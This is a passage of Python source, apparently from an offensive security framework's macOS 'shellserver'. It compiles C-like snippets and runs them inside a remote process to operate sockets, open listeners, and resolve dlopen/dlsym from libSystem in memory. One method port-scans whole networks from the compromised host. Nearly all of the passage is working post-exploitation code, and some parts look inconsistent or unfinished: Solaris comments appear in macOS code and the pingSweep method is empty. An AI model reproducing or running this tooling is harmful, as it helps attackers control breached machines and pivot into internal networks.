            write(filefd,buf,left);
            }
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()
        return

    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """

        if timeout==None:
            timeout=0
        code="""
            #import "local","select" as "select"
            #import "local","FD_ZERO" as "FD_ZERO"
            #import "local","FD_SET" as "FD_SET"
            #import "int" , "readfd" as "readfd"
            #import "int" , "timeout" as "timeout"
            #import "local", "sendint" as "sendint"

            struct timeval {
            int tv_sec;
            int tv_usec;
            };

            void main() {
            int nfds;
            int read_fdset[32];
            struct timeval tv;
            int i;

            tv.tv_sec=timeout;
            tv.tv_usec=0;

            nfds=readfd+1;
            FD_ZERO(read_fdset);
            FD_SET(readfd,read_fdset);
            i=select(nfds, read_fdset, 0, 0, &tv);
            if (i>0) {
            sendint(1);
            }
            else {
            sendint(0);
            }
            }
            """
        vars={}
        vars["timeout"]=timeout
        vars["readfd"]=fd

        self.clearfunctioncache()
        try:
            message=self.compile(code,vars)
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)

        self.sendrequest(message)
        ret=self.readint()
        self.leave()
        return ret


    def setblocking(self,fd,blocking):
        code="""
            #import "local", "fcntl" as "fcntl"
            #import "int", "O_NONBLOCK" as "O_NONBLOCK"
            #import "int", "O_BLOCK" as "O_BLOCK"
            #import "int", "sock" as "sock"
            #import "int", "F_SETFL" as "F_SETFL"
            #import "int", "F_GETFL" as "F_GETFL"

            void main() {
            int opts;

            opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
            """
        if blocking:
            #set blocking by clearing the nonblocking flag
            code+="opts=opts & O_BLOCK;\n"
        else:
            #set nonblocking
            code+="opts=opts | O_NONBLOCK;\n"
        code+="""
            fcntl(sock,F_SETFL,opts);
            }
            """
        vars={}
        vars["O_NONBLOCK"]=  0x0004
        vars["O_BLOCK"]   = ~0x0004
        vars["sock"]      =  fd
        vars["F_SETFL"]   =  4
        vars["F_GETFL"]   =  3
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def setsockopt(self,fd,option,arg):
        code="""
            #import "local", "setsockopt" as "setsockopt"
            #import "int","arg" as "arg"
            #import "int","option" as "option"
            #import "int","level" as "level"
            #import "int", "sock" as "sock"

            void main() {
            int argument;
            argument=arg;
            setsockopt(sock,level, option,&argument, 4);
            }
            """
        vars={}
        vars["option"]=option
        vars["arg"]=arg
        vars["sock"]=fd
        vars["level"]=0xffff #SOL_SOCKET
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
            #import "local", "recv" as "recv"
            #import "local", "writeblock2self" as "writeblock2self"
            #import "int", "length" as "length"
            #import "int", "fd" as "fd"

            void main() 
            {
            int i;
            char buf[1000];
            int wanted;
            //flags set to zero here
            wanted=length;
            while (wanted > 0 ) {
            if (wanted < 1000) {
            i=recv(fd,buf,wanted,0);
            }
            else
            {
            i=recv(fd,buf,1000,0);
            }
            if (i<0)
            {
            writeblock2self(buf,0); 
            wanted=0;
            }
            else 
            {
            writeblock2self(buf,i);
            wanted=wanted-i;
            }

            }
            }
            """
        vars={}
        vars["fd"]=fd
        vars["length"]=int(length)
        self.clearfunctioncache()
        message=self.compile(code,vars)


        return message

    def recv(self,fd, length):
        """
          reliable recv from socket
          """
        print "Recieving %d bytes from fd %d"%(length,fd)
        message=self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength=0
        ret=[]
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        #print "Got %d: %s"%(len(buffer),prettyprint(buffer))
        self.leave()
        return buffer

    def recv_lazy(self,fd,timeout=None,length=1000):
        """Get whatever is there"""
        print "In recv_lazy fd=%d"%fd
        if timeout==None:
            timeout=0 #immediately return
        if length > 1000:
            length=1000

        #print "LENGTH SET TO: %d"%length

        code="""
            #import "local", "recv" as "recv"
            #import "local", "sendblock2self" as "sendblock2self"
            #import "int", "fd" as "fd"
            #import "int", "timeout" as "timeout"
            #import "int", "length" as "length"
            #import "local", "poll" as "poll"

            struct pollfd {
            int fd;     
            short events;
            short revents;
            };

            void main() 
            {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;

            ufds.fd = fd;

//#define POLLIN          0x0001          /* fd is readable */
//#define POLLPRI         0x0002          /* high priority info at fd */
//#define POLLOUT         0x0004          /* fd is writeable (won't block) */
//#define POLLRDNORM      0x0040          /* normal data is readable */

            ufds.events = 0x0001;
            ufds.revents = 0x0000;
            //timeout is in ms
            i = poll(&ufds,1,timeout);
            r = ufds.revents & 0x0001;
            if (r > 0) {
            i=recv(fd, buf, length, 0);
            } 
            else
            {
            i = -1;
            }
            if (i < 0)
            {
            //we use send because we have no idea how much we're recieving
            sendblock2self(buf, 0); 
            }
            else 
            {
            sendblock2self(buf, i);
            }
            }
            """    
        vars={}
        vars["fd"]=fd
        # miliseconds
        vars["timeout"]=timeout
        vars["length"]=length
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        devlog('MOSDEFSock::readblock', "Before readblock")
        buffer=self.readblock()
        devlog('MOSDEFSock::readblock', "After readblock")
        self.leave()
        return buffer

    def accept(self,fd):
        code="""
            #import "local", "accept" as "accept"
            #import "int", "fd" as "fd"
            #import "local", "sendint" as "sendint"
            #import "local", "debug" as "debug"
            #include "socket.h"
            void main()
            {
            int i;
            struct sockaddr_in sa;
            int len;
            i=accept(fd, &sa, &len);
            sendint(i);
            sendint(sa.addr);
            }
            """
        vars={}
        vars["fd"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint()
        addr=self.readint()
        print "accept() returns -> ret: %s addr: %s" % (str(ret), str(addr))

        self.leave()
        return ret

    def getDLlibs(self):
        # 0x90000000 is the base address of libSystem
        code = """
             #import "local","sendint" as "sendint"

             void main() 
             {
             long *ptr;
             long ncmds;
             long cmd;
             char *stroff;
             long nsyms;
             long *symoff;
             long *ptr;
             unsigned int a;
             unsigned int ndx;
             long n_strx;
             long n_value;
             long segment[12];

             ptr=0x90000000;
             ncmds= ptr[0]; //magic number
             if(ncmds!=0xfeedface) {
             sendint(-1);
             return 0;
             }

             ncmds = ptr[4];  // number of commands
             ptr= ptr + 7;

             ndx=0;

             for(a=0; a < ncmds; a= a+1) {  //looping over the commands
             cmd=ptr[0];          // command->cmd

             if( cmd == 2) {      // cmd == LC_SYMTAB
             symoff = ptr[2];
             nsyms  = ptr[3];
             stroff = ptr[4];
             }

             if( cmd == 1) {      // cmd == LC_SEGMENT

             if( ptr[9] != 0) {  // PAGE_ZERO has its filesz==0
             if(ndx < 11) {  // we only allow 3 segments (hopefully, thats enough)

             segment[ndx] = ptr[6]; //vmaddr
             ndx= ndx + 1;
             segment[ndx] = ptr[7]; //vmsize
             ndx= ndx + 1;
             segment[ndx] = ptr[8]; //fileoff
             ndx= ndx + 1;
             segment[ndx] = ptr[9]; //filesz
             ndx= ndx + 1;

             }

             }
             }
             cmd = ptr[1]; // command->cmdsize
             ptr= ptr + cmd/4;
             }
             a=0;
             cmd=0;
             if(ndx == 0) {
             sendint(-1);
             return 0;
             }
             cmd=0xffffffff;
             while (a < ndx) { 
             n_strx = a+2; //fileoff index
             ncmds = a+3;  //filesz index
             n_value = segment[ncmds];   // value of filesz
             n_value = n_value + segment[n_strx]; // border of the segment

             if(segment[n_strx] < symoff) {  // if( (symoff < seg->fileoff) AND (symoff < (seg->fileoff+seg->filesz)) )
             if( n_value    > symoff) {
             cmd= a;
             }
             }
             a= a + 4;
             }
             if(cmd == 0xffffffff) {
             sendint(-1);
             return 0;
             }
             a=cmd+2;
             n_strx = symoff; 
             n_strx = n_strx - segment[a];  // symoff = symoff- fileoff(segment[2]) + vmaddr (segment[0])
             n_strx = n_strx + segment[cmd];
             symoff = n_strx;   

             n_strx = stroff;
             n_strx = n_strx - segment[a];  // stroff = stroff- fileoff(segment[2]) + vmaddr (segment[0])
             n_strx = n_strx + segment[cmd];
             stroff= n_strx;


             for( a=0 ; a < nsyms; a= a+1 ) {
             n_strx = stroff;
             n_strx = n_strx + symoff[0];
             ptr = n_strx;
             if(ptr[0] == 0x5f646c6f) {
             sendint(ptr[0]);    // string (_dlo)
             sendint(symoff[2]); // value  (addr)
             }
             if(ptr[0] == 0x5f646c73) {
             sendint(ptr[0]);    // string (_dls)
             sendint(symoff[2]); // value  (addr)
             }

             symoff = symoff+3;
             }

             return 0;

             }
             """
        self.clearfunctioncache()
        message = self.compile(code, {})
        self.sendrequest(message)
        dlopen = 0
        dlsym  = 0
        for a in range(2):               
            n_strx  = self.readint()
            if n_strx == -1:
                raise Exception, "Error on getDLibs, couldn't get dlopen/dlsym address"
            n_value = self.readint()
            if n_strx == 0x5f646c6f:
                dlopen = n_value
            elif n_strx == 0x5f646c73:
                dlsym  = n_value
        self.leave()
        return (dlopen, dlsym)

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""
        devlog('shellserver::getsendcode', "Sending %d bytes to fd %d" % (len(buffer), fd))
        code="""
            #import "int", "length" as "length"
            #import "int", "fd" as "fd"
            #import "string", "buffer" as "buffer"
            #import "local", "send" as "send"
            void main() 
            {
            int i;
            char *p;
            int wanted;
            wanted=length;
            p=buffer;
            while (wanted > 0 ) {
            i=send(fd,p,wanted,0); // flags set to zero here
            if (i<0) {
            wanted=0; 
            }
            wanted=wanted-i;
            p=p+i;
            }
            }
            """
        vars={}
        vars["fd"]=fd
        vars["length"]=len(buffer)
        vars["buffer"]=buffer
        self.clearfunctioncache()
        message=self.compile(code,vars)
        return message

    def send(self,fd,buffer):
        """
          reliable send to socket
          """
        message=self.getsendcode(fd,buffer)
        self.sendrequest(message)
        self.leave()
        return 

    def socket(self,proto):
        """
          calls socket and returns a file descriptor or -1 on failure.
          """
        code="""
            #import "int", "AF_INET" as "AF_INET"
            #import "int", "proto" as "proto"
            #include "socket.h"
            #import "local", "socket" as "socket"
            #import "local", "sendint" as "sendint"

            void main()
            {
            int i;
            i=socket(AF_INET, proto, 0);
            sendint(i);
            }
            """
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            print "Don't know anything about protocol %s in socket()"%proto
            return -1

        vars={}
        vars["proto"]=proto
        vars["AF_INET"]=AF_INET

        self.clearfunctioncache()
        message = self.compile(code, vars)
        self.sendrequest(message)
        ret = self.readint()
        self.leave()
        return ret

    def connect(self,fd,host,port,proto,timeout):
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            print "Protocol not recognized"
            return -1
        return self.connect_sock(fd,host,port,proto,timeout)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
          Does a tcp connect with a timeout
          """
        code="""
            #import "int", "AF_INET" as "AF_INET"
            #import "int", "SOL_SOCKET" as "SOL_SOCKET"
            #import "int", "SO_ERROR" as "SO_ERROR"
            #import "int", "ip" as "ip"
            #import "int", "port" as "port"
            #import "int", "proto" as "proto"
            #import "int", "sockfd" as "sockfd"
            #import "int", "timeout" as "timeout"
            #include "socket.h"
            #import "local", "getsockopt" as "getsockopt"
            #import "local", "connect" as "connect"
            #import "local", "close" as "close"
            #import "local", "socket" as "socket"
            #import "local", "sendint" as "sendint"
            #import "local", "htons" as "htons"
            #import "local", "htonl" as "htonl"
            #import "local", "poll" as "poll"
            #import "local", "memset" as "memset"
            #import "local", "debug" as "debug"
            #import "int", "F_SETFL" as "F_SETFL"
            #import "int", "F_GETFL" as "F_GETFL"
            #import "local", "fcntl" as "fcntl"
            #import "int", "O_NONBLOCK" as "O_NONBLOCK"
            #import "int", "O_BLOCK" as "O_BLOCK"

            struct pollfd {
            int fd;
            short events;
            short revents;
            };

            int
            main()
            {
            int i;
            int ret;
            int ilen;
            int sockopt;
            int opts;

            struct sockaddr_in serv_addr;
            struct pollfd ufd;

            //sockfd is set on MOSDEFSock init
            //sockfd=socket(AF_INET,SOCK_STREAM,0);

            //debug();
            memset(&serv_addr, 0x0, 16);

            serv_addr.family=AF_INET;
            // solaris byte ordering is already byte ordered correctly :P 
            serv_addr.port = port;
            serv_addr.addr = ip; 

            // set to non-blocking
            opts=fcntl(sockfd, F_GETFL, 0);
            opts=opts | O_NONBLOCK;
            fcntl(sockfd, F_SETFL, opts); 

            // errno is in %o0, sooo we check directly for return value == to errno
            // just a semantic due to us doing direct so_socket libc ;) ill implement
            // a proper errno mechanism some other heezy, for now i make our syscalls
            // negate the errno so we have linux style errno and we don't have to change
            // every < 0 return check ;)

            //debug();
            ret = connect(sockfd, &serv_addr, 16);
            if (ret < 0) {
            // EINPROGRESS 
            if (ret == -150) {
            ufd.fd = sockfd;
            //requested events shorts
//#define POLLIN          0x0001          /* fd is readable */
//#define POLLPRI         0x0002          /* high priority info at fd */
//#define POLLOUT         0x0004          /* fd is writeable (won't block) */
//#define POLLRDNORM      0x0040          /* normal data is readable */

            ufd.events = 0x0004;
            ufd.revents = 0x0000;
            //debug();
            i=poll(&ufd, 1, timeout);
            if (i > 0) {
            sockopt = 0;
            ilen = 4;
            // another possibility would be to check for getpeername() returning 0
            // if that's the case, the socket is connected, would be more portable
            // than getsockopt (are we doing THAT ancient?)

            getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);

            if (sockopt) {
            // error occurred on socket
            sendint(-1);
            return;
            }
            }
            // timeout or error
            else {
            sendint(-2);
            return;
            }
            }
            // some other errno was set
            else {
            sendint(-1);
            return;

            }
            }

            // connect (with timeout) succeeded

            // set back to blocking
            opts=fcntl(sockfd, F_GETFL, 0);
            opts=opts & O_BLOCK;
            fcntl(sockfd, F_SETFL, opts);

            sendint(0);
            }
            """
        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        vars={}
        vars["AF_INET"]= AF_INET
        vars["ip"]= hostlong
        vars["port"]= port
        vars["proto"]= proto
        vars["sockfd"]= fd
        vars["timeout"]= timeout*1000 # miliseconds
        vars["F_SETFL"]= 4
        vars["F_GETFL"]= 3
        vars["O_NONBLOCK"]= 0x04
        vars["O_BLOCK"]= 0xfffffffbL
        vars["SOL_SOCKET"]= 0xffff
        vars["SO_ERROR"]= 0x1007

        self.clearfunctioncache()
        try:
            message=self.compile(code,vars)              
            self.sendrequest(message)
            ret=self.readint()
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)


        self.leave()
        return ret

    def getListenSock(self,addr,port):
        """
          Creates a tcp listener socket fd on a port
          """
        vars={}
        code="""
            #import "local", "bind" as "bind"
            #import "local", "listen" as "listen"
            #import "local", "socket" as "socket"
            #import "local", "sendint" as "sendint"
            #import "local", "htons" as "htons"
            #import "local", "htonl" as "htonl"
            #import "local", "memset" as "memset"
            #import "int", "addr" as "addr"
            #import "int", "port" as "port"

            #import "int", "AF_INET" as "AF_INET"
            #import "int", "SOCK_STREAM" as "SOCK_STREAM"
            #include "socket.h"

            void main()
            {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;
            memset(&serv_addr, 0x0, 16);

            serv_addr.family=AF_INET; //af_inet

            sockfd=socket(AF_INET,SOCK_STREAM,0);

            serv_addr.port=port;
            serv_addr.addr=addr;
            i=bind(sockfd,&serv_addr,16);
            if (i!=-1) {
            i=listen(sockfd,16);
            if (i!=-1) {
            sendint(sockfd); //success
            }
            else {
            sendint(-2); //failed to listen
            }
            }
            else {
            sendint(-1); //failed to bind

            }

            }
            """
        vars["port"]=port
        vars["addr"]=str2bigendian(socket.inet_aton(addr))
        vars["AF_INET"]=AF_INET
        vars["SOCK_STREAM"]=SOCK_STREAM
        self.clearfunctioncache()
        request=self.compile(code,vars)
        print "getListenSock(%s, %d)" % (addr, port)
        self.sendrequest(request)
        fd=self.readint()
        self.leave()
        return fd

    def tcpConnectScan(self,network,startport=1,endport=1024):
        """
          Connectscan from the remote host! 
          """


        if network.count("/"):
            network,netmask=network.split("/")
        else:
            netmask=32
        netmask=int(netmask)

        hostlong=socket.gethostbyname(network) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))
        numberofips=2**(32-netmask) #how many ip's total
        startip=hostlong&(~(numberofips-1)) #need to mask it out so we don't do wacky things

        vars={}
        vars["startip"]=startip
        vars["numberofips"]=numberofips
        vars["AF_INET"]=AF_INET
        vars["SOCK_STREAM"]=SOCK_STREAM
        vars["startport"]=startport
        vars["endport"]=endport

        code="""
            #import "local", "connect" as "connect"
            #import "local", "close" as "close"
            #import "local", "socket" as "socket"
            #import "local", "sendint" as "sendint"
            #import "local", "htons" as "htons"
            #import "local", "htonl" as "htonl"
            #import "local", "debug" as "debug"
            #import "int", "startip" as "startip"         
            #import "int", "startport" as "startport"
            #import "int", "endport" as "endport"
            #import "int", "numberofips" as "numberofips"
            #import "int", "AF_INET" as "AF_INET"
            #import "int", "SOCK_STREAM" as "SOCK_STREAM"
            #include "socket.h"

            void main()
            {
            int currentport;
            int sockfd;
            int fd;
            int doneips;
            int currentip;

            struct sockaddr_in serv_addr;

            serv_addr.family=AF_INET; //af_inet
            currentip=startip;
            doneips=0;

            while (doneips<numberofips)
            {
            //FOR EACH IP...
            doneips=doneips+1;
            serv_addr.addr=htonl(currentip);
            currentport=startport;
            while (currentport<endport) {
            //FOR EACH PORT
            //debug();
            sockfd=socket(AF_INET,SOCK_STREAM,0);
            //debug();
            serv_addr.port=currentport;
            if (connect(sockfd,&serv_addr,16)==0) {
            //sendint(23);
            sendint(currentport);
            }
            //debug();
            //sendint(22);
            close(sockfd);
            //sendint(20);
            currentport=currentport+1;
            //sendint(21);

            }
            currentip=currentip+1;
            }
            sendint(0xffffffff);
            }
            """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        port=0
        openports=[]
        while port!=-1:
            port=self.readint()
            if port!=-1:
                openports.append(port)
        self.leave()
        return openports

    def pingSweep(self,network):
        """
          pingsweep the target network
          """
    
# new code

def osxshellserver(*args, **kargs):
    WARNING = "WARNING osxshellserver() called. you should replace it by MosdefShellServer('OSX', 'i386/ppc')..."
    print WARNING
    _osxshellserver = MosdefShellServer('OSX', 'x86') # or PPC! 
    return _osxshellserver(*args, **kargs)

